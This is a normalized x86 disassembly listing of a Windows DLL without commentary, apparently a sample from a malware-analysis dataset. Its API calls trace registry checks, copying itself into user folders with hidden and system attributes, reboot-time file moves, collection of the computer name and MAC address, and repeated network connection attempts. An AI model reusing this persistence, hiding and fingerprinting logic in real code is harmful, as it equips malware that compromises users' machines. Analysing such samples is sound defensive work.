push 0x103
lea eax [ esp + 0x15 ]
push ebx
push eax
mov [ esp + 0x1c ] bl
call sub_1000ebe0
push 0x20
push edi
call sub_1000cfd0
add esp 0x14
test eax eax
je r-xdata
mov ecx r--data
lea edx [ esp + 0x218 ]
call sub_100029c0
mov ecx r--data
lea edx [ esp + 0x114 ]
call sub_100029c0
lea edx [ esp + 0x8 ]
push edx
push 0x20019
push ebx
lea eax [ esp + 0x224 ]
push eax
push 0x80000001
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
push 0x104
lea ecx [ esp + 0x14 ]
push ecx
push edi
call [ GetShortPathNameA@IAT ]
test eax eax
jbe r-xdata
push esi
lea ecx [ esp + 0x10 ]
push ecx
lea edx [ esp + 0x324 ]
push edx
mov edx [ esp + 0x14 ]
lea eax [ esp + 0x10 ]
push eax
push ebx
lea ecx [ esp + 0x128 ]
push ecx
push edx
mov [ esp + 0x20 ] 0x1
mov [ esp + 0x28 ] 0x400
call [ RegQueryValueExA@IAT ]
mov esi eax
mov eax [ esp + 0xc ]
push eax
call [ RegCloseKey@IAT ]
xor eax eax
cmp esi ebx
sete al
pop esi
cmp eax ebx
je r-xdata
lea eax [ esp + 0x10 ]
lea edx [ eax + 0x1 ]
nop
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
je r-xdata
lea eax [ esp + 0x31c ]
push edi
push eax
call sub_10007c00
add esp 0x8
neg eax
sbb eax eax
neg eax
pop ebx
mov ecx [ esp + 0x718 ]
xor ecx esp
call sub_1000c176
add esp 0x71c
retn
lea ecx [ esp + 0x10 ]
push ecx
lea edx [ esp + 0x320 ]
push edx
call sub_10007c00
add esp 0x8
neg eax
sbb eax eax
neg eax
pop ebx
mov ecx [ esp + 0x718 ]
xor ecx esp
call sub_1000c176
add esp 0x71c
retn
sub_10003a40
sub esp 0x468
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x464 ] eax
mov eax [ esp + 0x46c ]
push ebp
push edi
push 0x103
lea ecx [ esp + 0x25d ]
push 0x0
push ecx
mov [ esp + 0x18 ] eax
mov [ esp + 0x264 ] 0x0
call sub_1000ebe0
push 0x103
lea edx [ esp + 0x161 ]
push 0x0
push edx
mov [ esp + 0x168 ] 0x0
call sub_1000ebe0
push 0x103
lea eax [ esp + 0x37d ]
push 0x0
push eax
mov [ esp + 0x384 ] 0x0
call sub_1000ebe0
lea edx [ esp + 0x27c ]
add esp 0x24
mov eax esi
sub edx esi
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
test cl cl
jne r-xdata
lea eax [ esp + 0x258 ]
dec eax
mov cl [ eax + 0x1 ]
inc eax
test cl cl
jne r-xdata
mov cx [ r--data ]
mov dl [ r--data ]
mov [ eax ] cx
mov [ eax + 0x2 ] dl
lea eax [ esp + 0x10 ]
push eax
lea ecx [ esp + 0x25c ]
push ecx
call [ FindFirstFileA@IAT ]
mov [ esp + 0x8 ] eax
cmp eax 0xffffffff
je r-xdata
mov ecx [ esp + 0x46c ]
pop edi
pop ebp
xor ecx esp
mov eax 0x1
call sub_1000c176
add esp 0x468
retn
mov edi [ CopyFileA@IAT ]
mov ebp [ DeleteFileA@IAT ]
mov eax [ esp + 0x8 ]
lea edx [ esp + 0x10 ]
push edx
push eax
call [ FindNextFileA@IAT ]
test eax eax
jne r-xdata
lea edx [ esp + 0x3c ]
push r--data
push edx
call sub_10007c00
add esp 0x8
test eax eax
jne r-xdata
test [ esp + 0x10 ] 0x10
jne r-xdata
lea edx [ esp + 0x3c ]
push edx
push esi
lea eax [ esp + 0x158 ]
push r--data
push eax
call sub_1000c36c
add esp 0x10
lea eax [ esp + 0x3c ]
push eax
push esi
lea ecx [ esp + 0x158 ]
push r--data
push ecx
call sub_1000c36c
mov eax [ esp + 0x1c ]
lea edx [ esp + 0x4c ]
push edx
push eax
lea ecx [ esp + 0x378 ]
push r--data
push ecx
call sub_1000c36c
add esp 0x20
push 0x0
lea edx [ esp + 0x364 ]
push edx
lea eax [ esp + 0x158 ]
push eax
call edi
test eax eax
je r-xdata
jmp r-xdata
lea ecx [ esp + 0x150 ]
push ecx
call ebp
sub_10003bf0
sub esp 0x648
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x644 ] eax
mov eax [ esp + 0x64c ]
push ebx
push ebp
push esi
push edi
xor ebx ebx
push 0x103
lea ecx [ esp + 0x54d ]
push ebx
push ecx
mov [ esp + 0x28 ] eax
mov [ esp + 0x554 ] bl
call sub_1000ebe0
add esp 0xc
push 0x103
lea edx [ esp + 0x235 ]
push ebx
push edx
mov [ esp + 0x23c ] bl
call sub_1000ebe0
add esp 0xc
push 0x103
lea eax [ esp + 0x445 ]
push ebx
push eax
mov [ esp + 0x44c ] bl
call sub_1000ebe0
add esp 0xc
push 0x103
lea ecx [ esp + 0x25 ]
push ebx
push ecx
mov [ esp + 0x2c ] bl
call sub_1000ebe0
add esp 0xc
push 0x103
lea edx [ esp + 0x12d ]
push ebx
push edx
mov [ esp + 0x134 ] bl
call sub_1000ebe0
add esp 0xc
push 0x103
lea eax [ esp + 0x33d ]
push ebx
push eax
mov [ esp + 0x344 ] bl
call sub_1000ebe0
add esp 0xc
mov ecx r--data
lea edx [ esp + 0x548 ]
call sub_100029c0
mov ecx r--data
lea edx [ esp + 0x338 ]
call sub_100029c0
mov ebp [ RegOpenKeyExA@IAT ]
lea ecx [ esp + 0x14 ]
push ecx
push 0x20019
push ebx
lea edx [ esp + 0x554 ]
push edx
push 0x80000001
call ebp
test eax eax
jne r-xdata
push ebx
push 0x1a
lea eax [ esp + 0x448 ]
push eax
push ebx
call [ SHGetSpecialFolderPathA@IAT ]
lea eax [ esp + 0x18 ]
push eax
lea ecx [ esp + 0x444 ]
push ecx
mov ecx [ esp + 0x1c ]
lea edx [ esp + 0x18 ]
push edx
push ebx
lea eax [ esp + 0x348 ]
push eax
push ecx
mov [ esp + 0x28 ] 0x2
mov [ esp + 0x30 ] 0x104
call [ RegQueryValueExA@IAT ]
mov edx [ esp + 0x14 ]
push edx
mov esi eax
call [ RegCloseKey@IAT ]
xor eax eax
cmp esi ebx
sete al
cmp eax ebx
jne r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
lea edi [ esp + 0x440 ]
sub eax esi
dec edi
mov ecx r--data
lea edx [ esp + 0x230 ]
call sub_100029c0
lea eax [ esp + 0x230 ]
mov esi eax
lea ecx [ ecx ]
mov cl [ edi + 0x1 ]
inc edi
cmp cl bl
jne r-xdata
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov ecx r--data
lea edx [ esp + 0x338 ]
call sub_100029c0
lea ecx [ esp + 0x14 ]
push ecx
push 0x20019
push ebx
lea edx [ esp + 0x554 ]
push edx
push 0x80000001
call ebp
mov edi [ ExpandEnvironmentStringsA@IAT ]
test eax eax
jne r-xdata
push 0x104
lea edx [ esp + 0x24 ]
push edx
lea eax [ esp + 0x448 ]
push eax
call edi
lea eax [ esp + 0x128 ]
lea edx [ eax + 0x1 ]
nop
lea eax [ esp + 0x10 ]
push eax
lea ecx [ esp + 0x234 ]
push ecx
mov ecx [ esp + 0x1c ]
lea edx [ esp + 0x20 ]
push edx
push ebx
lea eax [ esp + 0x348 ]
push eax
push ecx
mov [ esp + 0x30 ] 0x2
mov [ esp + 0x28 ] 0x104
call [ RegQueryValueExA@IAT ]
mov edx [ esp + 0x14 ]
push edx
mov esi eax
call [ RegCloseKey@IAT ]
xor eax eax
cmp esi ebx
sete al
cmp eax ebx
je r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
je r-xdata
push 0x104
lea eax [ esp + 0x12c ]
push eax
lea ecx [ esp + 0x238 ]
push ecx
call edi
mov esi [ GetFileAttributesA@IAT ]
lea eax [ esp + 0x20 ]
push eax
call esi
cmp eax 0xffffffff
jne r-xdata
lea ecx [ esp + 0x128 ]
push ecx
lea edx [ esp + 0x24 ]
push edx
call sub_1000c31a
add esp 0x8
test eax eax
je r-xdata
lea ecx [ esp + 0x338 ]
push ecx
lea edi [ esp + 0x444 ]
lea eax [ esp + 0x54c ]
call sub_100087b0
lea eax [ esp + 0x12c ]
add esp 0x4
lea edx [ eax + 0x1 ]
lea ecx [ ecx ]
lea ecx [ esp + 0x20 ]
push ecx
call sub_10007d80
add esp 0x4
test eax eax
je r-xdata
mov ebp [ esp + 0x1c ]
push 0x5c
push ebp
call sub_1000d460
add esp 0x8
lea edx [ esp + 0x230 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
je r-xdata
mov ecx [ esp + 0x654 ]
pop edi
pop esi
pop ebp
pop ebx
xor ecx esp
call sub_1000c176
add esp 0x648
retn
lea edx [ esp + 0x20 ]
push edx
call esi
or eax 0x6
push eax
lea eax [ esp + 0x24 ]
push eax
call [ SetFileAttributesA@IAT ]
mov cl [ eax ]
mov [ edx ] cl
inc eax
inc edx
cmp cl bl
jne r-xdata
lea eax [ esp + 0x230 ]
mov edx eax
lea edx [ esp + 0x20 ]
push edx
lea esi [ esp + 0x12c ]
call sub_10003a40
add esp 0x4
push 0x4
push ebx
mov eax esi
push eax
call [ MoveFileExA@IAT ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
lea edi [ esp + 0x20 ]
sub eax edx
dec edi
mov cl [ edi + 0x1 ]
inc edi
cmp cl bl
jne r-xdata
mov ecx eax
shr ecx 0x2
mov esi edx
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
push ebx
lea ecx [ esp + 0x24 ]
push ecx
push ebp
call [ CopyFileA@IAT ]
neg eax
sbb eax eax
neg eax
sub_10003fa0
sub esp 0x51c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x518 ] eax
push ebx
push esi
push edi
xor ebx ebx
push 0x103
lea eax [ esp + 0x321 ]
push ebx
push eax
mov edi ecx
mov [ esp + 0x328 ] bl
call sub_1000ebe0
push 0xff
lea ecx [ esp + 0x129 ]
push ebx
push ecx
mov [ esp + 0x130 ] bl
call sub_1000ebe0
push 0xff
lea edx [ esp + 0x35 ]
push ebx
push edx
mov [ esp + 0x3c ] bl
call sub_1000ebe0
push 0x103
lea eax [ esp + 0x241 ]
push ebx
push eax
mov [ esp + 0x248 ] bl
call sub_1000ebe0
push 0x103
lea ecx [ esp + 0x455 ]
push ebx
push ecx
mov [ esp + 0x45c ] bl
call sub_1000ebe0
add esp 0x3c
mov ecx r--data
lea edx [ esp + 0x18 ]
call sub_100029c0
mov ecx r--data
lea edx [ esp + 0x31c ]
call sub_100029c0
mov ecx r--data
lea edx [ esp + 0x420 ]
call sub_100029c0
lea edx [ esp + 0xc ]
push edx
push 0x20019
push ebx
lea eax [ esp + 0x328 ]
push eax
push 0x80000001
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov ecx [ esp + 0x518 ]
xor ecx esp
call sub_1000c176
add esp 0x51c
retn
lea ecx [ esp + 0x10 ]
push ecx
lea edx [ esp + 0x21c ]
push edx
mov edx [ esp + 0x14 ]
lea eax [ esp + 0x1c ]
push eax
push ebx
lea ecx [ esp + 0x430 ]
push ecx
push edx
mov [ esp + 0x2c ] 0x2
mov [ esp + 0x28 ] 0x104
call [ RegQueryValueExA@IAT ]
mov esi eax
mov eax [ esp + 0xc ]
push eax
call [ RegCloseKey@IAT ]
xor eax eax
cmp esi ebx
sete al
cmp eax ebx
je r-xdata
lea ecx [ esp + 0x18 ]
push ecx
lea edx [ esp + 0x21c ]
push edx
call sub_10007c00
add esp 0x8
test eax eax
jne r-xdata
push ebp
push 0x104
lea eax [ esp + 0x120 ]
push eax
lea ecx [ esp + 0x224 ]
push ecx
call [ ExpandEnvironmentStringsA@IAT ]
mov ebp [ GetFileAttributesA@IAT ]
lea edx [ esp + 0x11c ]
push edx
call ebp
cmp eax 0xffffffff
jne r-xdata
push 0x5c
push edi
call sub_1000d460
add esp 0x8
lea edx [ esp + 0x1c ]
xor eax eax
jmp r-xdata
mov cl [ eax ]
mov [ edx ] cl
inc eax
inc edx
cmp cl bl
jne r-xdata
lea eax [ esp + 0x1c ]
mov edx eax
mov ecx [ esp + 0x528 ]
pop ebp
pop edi
pop esi
pop ebx
xor ecx esp
call sub_1000c176
add esp 0x51c
retn
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
lea edi [ esp + 0x11c ]
sub eax edx
dec edi
mov cl [ edi + 0x1 ]
inc edi
cmp cl bl
jne r-xdata
mov ecx eax
shr ecx 0x2
mov esi edx
[ edi ] [ esi ]
mov ecx eax
lea eax [ esp + 0x11c ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call ebp
xor ecx ecx
cmp eax 0xffffffff
setne cl
mov eax ecx
sub_100041c0
sub esp 0x120
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x11c ] eax
push ebx
push ebp
mov ebp [ esp + 0x12c ]
push esi
push edi
push 0x103
lea eax [ esp + 0x25 ]
push 0x0
push eax
mov edi ecx
mov [ esp + 0x2c ] 0x0
call sub_1000ebe0
add esp 0xc
xor eax eax
push edi
xor esi esi
xor ebx ebx
mov [ esp + 0x1c ] eax
mov [ esp + 0x18 ] eax
call [ GetFileAttributesA@IAT ]
cmp eax 0xffffffff
jne r-xdata
call sub_10003850
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
mov ecx edi
call sub_10003fa0
test eax eax
jne r-xdata
push edi
lea esi [ eax + 0x1 ]
call sub_100035b0
add esp 0x4
mov [ esp + 0x18 ] eax
mov ecx [ esp + 0x12c ]
pop edi
pop esi
pop ebp
pop ebx
xor ecx esp
call sub_1000c176
add esp 0x120
retn
test ebp ebp
je r-xdata
push edi
lea ebx [ eax + 0x1 ]
call sub_10003bf0
add esp 0x4
mov [ esp + 0x14 ] eax
cmp [ esp + 0x18 ] 0x0
jne r-xdata
mov eax ebp
lea edx [ eax + 0x1 ]
mov eax 0x1
cmp [ esp + 0x14 ] 0x0
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
je r-xdata
test esi esi
jne r-xdata
lea edx [ esp + 0x20 ]
mov eax edi
sub edx edi
test ebx ebx
je r-xdata
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
test cl cl
jne r-xdata
lea ecx [ esp + 0x20 ]
push 0x5c
push ecx
call sub_1000d460
add esp 0x8
mov [ eax ] 0x0
test esi esi
je r-xdata
test ebx ebx
je r-xdata
cmp [ esp + 0x18 ] 0x0
mov edx ebp
lea ecx [ esp + 0x20 ]
je r-xdata
cmp [ esp + 0x14 ] 0x0
mov edx ebp
lea ecx [ esp + 0x20 ]
je r-xdata
push 0xb
push 0xa
jmp r-xdata
push 0x15
push 0x14
jmp r-xdata
call sub_100031b0
add esp 0x4
call sub_100031b0
add esp 0x4
sub_10004300
sub esp 0x8
push esi
lea eax [ esp + 0x8 ]
push eax
mov [ esp + 0xc ] 0x0
call GetNumberOfInterfaces
mov eax [ esp + 0x8 ]
imul eax eax 0x288
push eax
mov [ esp + 0x8 ] eax
call sub_1000cef2
mov esi eax
add esp 0x4
test esi esi
jne r-xdata
lea ecx [ esp + 0x4 ]
push ecx
push esi
call GetAdaptersInfo
cmp eax 0x6f
jne r-xdata
xor eax eax
pop esi
add esp 0x8
retn
movzx ecx [ esi + 0x199 ]
movzx edx [ esi + 0x198 ]
movzx eax [ esi + 0x197 ]
push ecx
movzx ecx [ esi + 0x196 ]
push edx
movzx edx [ esi + 0x195 ]
push eax
movzx eax [ esi + 0x194 ]
push ecx
mov ecx [ esp + 0x20 ]
push edx
push eax
push r--data
push ecx
call sub_1000c36c
add esp 0x20
mov eax 0x1
pop esi
add esp 0x8
retn
mov edx [ esp + 0x4 ]
push edx
push esi
call sub_1000d6b9
mov esi eax
add esp 0x8
test esi esi
je r-xdata
lea eax [ esp + 0x4 ]
push eax
push esi
call GetAdaptersInfo
sub_100043c0
sub esp 0x108
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x104 ] eax
push ebp
mov ebp [ esp + 0x110 ]
push 0x103
lea eax [ esp + 0x9 ]
push 0x0
push eax
mov [ esp + 0x10 ] 0x0
call sub_1000ebe0
add esp 0xc
mov ecx r--data
lea edx [ esp + 0x4 ]
call sub_100029c0
push 0x0
push 0x1a
push ebx
push 0x0
call [ SHGetSpecialFolderPathA@IAT ]
lea eax [ esp + 0x4 ]
mov ecx eax
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
push esi
push edi
mov edi ebx
sub eax ecx
mov esi ecx
dec edi
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
push ebx
[ edi ] [ esi ]
call [ GetFileAttributesA@IAT ]
cmp eax 0xffffffff
jne r-xdata
mov ecx r--data
lea edx [ esp + 0xc ]
call sub_100029c0
push 0x0
push 0x1a
push ebp
push 0x0
call [ SHGetSpecialFolderPathA@IAT ]
lea eax [ esp + 0xc ]
mov ecx eax
push ebx
call sub_10007d80
add esp 0x4
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
mov edi ebp
sub eax ecx
mov esi ecx
dec edi
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
push ebp
[ edi ] [ esi ]
call [ GetFileAttributesA@IAT ]
pop edi
pop esi
cmp eax 0xffffffff
jne r-xdata
push ebx
call [ SetCurrentDirectoryA@IAT ]
mov ecx [ esp + 0x108 ]
pop ebp
xor ecx esp
call sub_1000c176
add esp 0x108
retn
push ebp
call sub_10007d80
add esp 0x4
sub_100044d0
sub esp 0x588
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x584 ] eax
mov eax [ esp + 0x590 ]
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x59c ]
xor ebx ebx
push 0xff
mov esi edx
lea edx [ esp + 0x395 ]
push ebx
push edx
mov [ esp + 0x1c ] eax
mov [ esp + 0x24 ] ecx
mov [ esp + 0x39c ] bl
call sub_1000ebe0
add esp 0xc
push 0xff
lea eax [ esp + 0x295 ]
push ebx
push eax
mov [ esp + 0x29c ] bl
call sub_1000ebe0
xor eax eax
add esp 0xc
push 0xff
lea ecx [ esp + 0x495 ]
push ebx
push ecx
mov [ esp + 0x25c ] bl
mov [ esp + 0x25d ] eax
mov [ esp + 0x261 ] eax
mov [ esp + 0x265 ] eax
mov [ esp + 0x269 ] eax
mov [ esp + 0x26d ] eax
mov [ esp + 0x271 ] eax
mov [ esp + 0x275 ] eax
mov [ esp + 0x279 ] ax
mov [ esp + 0x27b ] al
mov [ esp + 0x27c ] bl
mov [ esp + 0x27d ] eax
mov [ esp + 0x281 ] eax
mov [ esp + 0x285 ] eax
mov [ esp + 0x289 ] eax
mov [ esp + 0x28d ] eax
mov [ esp + 0x291 ] eax
mov [ esp + 0x295 ] eax
mov [ esp + 0x299 ] ax
mov [ esp + 0x29b ] al
mov [ esp + 0x49c ] bl
call sub_1000ebe0
add esp 0xc
lea edx [ esp + 0xc0 ]
push edx
push 0x202
call WSAStartup
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
push 0x63d
call sub_1000cef2
mov ebp eax
add esp 0x4
cmp ebp ebx
jne r-xdata
mov ecx [ esp + 0x594 ]
pop edi
pop esi
pop ebp
pop ebx
xor ecx esp
call sub_1000c176
add esp 0x588
retn
push 0x63d
push ebx
push ebp
call sub_1000ebe0
add esp 0xc
mov ecx r--data
lea edx [ esp + 0x390 ]
call sub_100029c0
lea ebx [ esp + 0x390 ]
call sub_10006170
mov [ ebp ] eax
test eax eax
je r-xdata
call WSACleanup
call WSACleanup
push ebp
call sub_1000c3e9
add esp 0x4
xor eax eax
jmp r-xdata
push r--data
push esi
call sub_1000c5d4
push r--data
push 0x0
call sub_1000c5d4
add esp 0x10
mov ebx 0x50
test eax eax
jne r-xdata
push eax
call sub_1000d6ae
add esp 0x4
mov eax ebx
jmp r-xdata
mov esi [ lstrcpyA@IAT ]
push edi
lea edx [ ebp + 0x8 ]
push edx
call esi
mov eax [ esp + 0x10 ]
push eax
lea ecx [ ebp + 0x328 ]
push ecx
call esi
push 0x9c
lea edx [ esp + 0x24 ]
push 0x0
push edx
call sub_1000ebe0
add esp 0xc
lea eax [ esp + 0x20 ]
push eax
mov [ esp + 0x24 ] 0x9c
call [ GetVersionExA@IAT ]
mov dl 0x58
test eax eax
je r-xdata
mov esi [ ebp ]
call sub_100062a0
mov ecx [ ebp ]
push esi
push ecx
call sub_100061e0
mov [ ebp + 0x4 ] eax
test eax eax
jne r-xdata
mov [ ebp + 0x348 ] bl
cmp [ esp + 0x24 ] 0x5
jb r-xdata
cmp [ ebp + 0x348 ] bl
jne r-xdata
push 0x0
push 0x6610
call sub_1000bb70
push 0x6610
call sub_1000bd30
add esp 0xc
test eax eax
jne r-xdata
cmp [ esp + 0x28 ] 0x0
jbe r-xdata
lea ecx [ esp + 0x1c ]
push ecx
lea edx [ esp + 0x294 ]
push edx
mov [ esp + 0x24 ] 0x3a
call [ GetComputerNameA@IAT ]
lea eax [ esp + 0x290 ]
push eax
call gethostbyname
mov [ esp + 0x10 ] 0x0
test eax eax
je r-xdata
push 0x0
push 0x6603
call sub_1000bb70
push 0x6603
call sub_1000bd30
add esp 0xc
test eax eax
jne r-xdata
push eax
call sub_1000be80
add esp 0x4
push eax
push 0x6610
call sub_1000bcc0
add esp 0x8
mov [ ebp + 0x348 ] bl
jmp r-xdata
mov [ ebp + 0x348 ] dl
jmp r-xdata
lea eax [ esp + 0x290 ]
lea edx [ eax + 0x1 ]
mov ecx [ eax + 0xc ]
mov edx [ ecx ]
mov eax [ edx ]
mov [ esp + 0x10 ] eax
push eax
call sub_1000be80
add esp 0x4
push eax
push 0x6603
call sub_1000bcc0
add esp 0x8
mov [ ebp + 0x348 ] 0x40
jmp r-xdata
mov eax [ esp + 0x5a4 ]
mov ecx [ eax ]
mov esi [ esp + 0x5a8 ]
mov [ ebp + 0x349 ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x34d ] eax
lea edi [ ebp + 0x351 ]
mov ecx 0x96
[ edi ] [ esi ]
mov esi [ esp + 0x5ac ]
lea edi [ ebp + 0x5a9 ]
mov ecx 0x25
[ edi ] [ esi ]
cmp [ ebp + 0x348 ] dl
jne r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
jne r-xdata
lea ecx [ esp + 0x390 ]
push ecx
call sub_10004300
lea edi [ esp + 0x294 ]
add esp 0x4
dec edi
mov ecx [ r--data ]
mov dx [ r--data ]
mov al [ r--data ]
mov [ esp + 0x290 ] ecx
mov [ esp + 0x294 ] dx
mov [ esp + 0x296 ] al
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov bx [ r--data ]
lea eax [ esp + 0x390 ]
mov [ edi ] bx
mov ecx eax
jmp r-xdata
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
lea edi [ esp + 0x290 ]
sub eax ecx
mov esi ecx
dec edi
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x290 ]
dec edi
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov eax rw-data
mov [ edi ] bx
mov ecx eax
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
lea edi [ esp + 0x290 ]
sub eax ecx
mov esi ecx
dec edi
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
movzx edx [ esp + 0x13 ]
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
movzx eax [ esp + 0x12 ]
push edx
push eax
mov eax [ esp + 0x18 ]
and ecx 0x3
[ edi ] [ esi ]
movzx ecx ah
movzx edx al
push ecx
push edx
lea eax [ esp + 0x260 ]
push r--data
push eax
call sub_1000c36c
movzx ecx [ ebp + 0x350 ]
movzx edx [ ebp + 0x34f ]
movzx eax [ ebp + 0x34e ]
push ecx
movzx ecx [ ebp + 0x34d ]
push edx
movzx edx [ ebp + 0x34c ]
push eax
movzx eax [ ebp + 0x34b ]
push ecx
movzx ecx [ ebp + 0x34a ]
push edx
movzx edx [ ebp + 0x349 ]
push eax
push ecx
push edx
lea eax [ esp + 0x2a8 ]
push r--data
push eax
call sub_1000c36c
movzx edx [ ebp + 0x348 ]
mov eax [ esp + 0x58 ]
add esp 0x40
lea ecx [ esp + 0x270 ]
push ecx
push edx
push eax
lea ecx [ esp + 0x29c ]
push ecx
lea edx [ esp + 0x4a0 ]
push r--data
push edx
call sub_1000c36c
add esp 0x18
xor edi edi
nop
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea eax [ esp + 0x494 ]
push eax
push 0x1
lea esi [ esp + 0x39c ]
call sub_10002640
add esp 0xc
test eax eax
je r-xdata
lea ecx [ esp + 0x390 ]
push ecx
lea edx [ ebp + 0x108 ]
push r--data
push edx
call sub_1000c36c
add esp 0xc
inc edi
cmp edi 0x3
jl r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax esi
jne r-xdata
lea eax [ esp + 0x490 ]
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
jmp r-xdata
xor edi edi
lea esp [ esp ]
lea eax [ esp + 0x490 ]
mov ecx eax
sub edx ecx
lea esp [ esp ]
lea edx [ ebp + 0x108 ]
mov eax edx
lea esi [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea edx [ esp + 0x294 ]
push edx
push 0x0
lea esi [ esp + 0x39c ]
call sub_10002640
add esp 0xc
test eax eax
je r-xdata
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
test cl cl
jne r-xdata
lea eax [ esp + 0x390 ]
push eax
lea ecx [ ebp + 0x208 ]
push r--data
push ecx
call sub_1000c36c
add esp 0xc
inc edi
cmp edi 0x3
jl r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea edx [ esp + 0x254 ]
push edx
push 0x0
lea esi [ esp + 0x39c ]
call sub_10002640
add esp 0xc
test eax eax
je r-xdata
lea eax [ esp + 0x290 ]
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
jmp r-xdata
lea eax [ esp + 0x390 ]
push eax
lea ecx [ ebp + 0x308 ]
push r--data
push ecx
call sub_1000c36c
add esp 0xc
inc edi
cmp edi 0x3
jl r-xdata
xor edi edi
lea ecx [ ecx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax esi
je r-xdata
lea eax [ esp + 0x250 ]
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
jmp r-xdata
lea eax [ esp + 0x290 ]
mov ecx eax
sub edx ecx
lea eax [ ebp + 0x308 ]
lea esi [ eax + 0x1 ]
lea ebx [ ebx ]
lea edx [ ebp + 0x208 ]
mov eax edx
lea esi [ eax + 0x1 ]
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
test cl cl
jne r-xdata
lea eax [ esp + 0x250 ]
lea edx [ ebp + 0x308 ]
mov ecx eax
sub edx ecx
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax esi
jne r-xdata
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
test cl cl
jne r-xdata
mov eax ebp
sub_10004b80
test edi edi
je r-xdata
retn
mov al [ edi + 0x348 ]
cmp al 0x50
jne r-xdata
cmp al 0x58
jne r-xdata
push 0x0
push 0x6603
jmp r-xdata
push esi
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
push 0x0
push 0x6610
call sub_1000bcc0
add esp 0x8
mov esi [ edi ]
test esi esi
je r-xdata
call sub_100062a0
call WSACleanup
push edi
call sub_1000c3e9
add esp 0x4
pop esi
call sub_100062a0
sub_10004be0
sub esp 0x718
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x714 ] eax
push ebx
push ebp
mov ebp [ esp + 0x724 ]
push esi
push edi
xor edi edi
push 0x401
lea eax [ esp + 0x11d ]
push edi
push eax
mov [ esp + 0x20 ] edi
mov [ esp + 0x124 ] 0x0
call sub_1000ebe0
add esp 0xc
push 0x1ff
lea ecx [ esp + 0x525 ]
push edi
push ecx
mov [ esp + 0x52c ] 0x0
call sub_1000ebe0
add esp 0xc
push 0xff
lea edx [ esp + 0x1d ]
push edi
push edx
mov [ esp + 0x24 ] 0x0
call sub_1000ebe0
add esp 0xc
cmp ebp edi
jne r-xdata
mov ecx r--data
lea edx [ esp + 0x118 ]
call sub_100029c0
call sub_1000ca3f
cdq
mov ecx 0x64
idiv ecx
lea eax [ esp + 0x118 ]
lea ecx [ esp + 0x520 ]
push edx
lea edx [ ebp + 0x8 ]
push edx
push eax
push ecx
call [ wsprintfA@IAT ]
add esp 0x10
mov ecx r--data
lea edx [ esp + 0x118 ]
call sub_100029c0
mov ebx [ Sleep@IAT ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp + 0x4 ]
push 0x4000000
lea edx [ esp + 0x524 ]
push edx
lea eax [ esp + 0x120 ]
push eax
push ecx
call sub_10006320
mov esi eax
test esi esi
jne r-xdata
mov ecx [ esp + 0x724 ]
pop edi
pop esi
pop ebp
pop ebx
xor ecx esp
call sub_1000c176
add esp 0x718
retn
mov ecx esi
call sub_10006470
test eax eax
jne r-xdata
inc edi
jmp r-xdata
cmp edi 0x3
jne r-xdata
call sub_100062a0
push 0x3e8
inc edi
call ebx
cmp edi 0x3
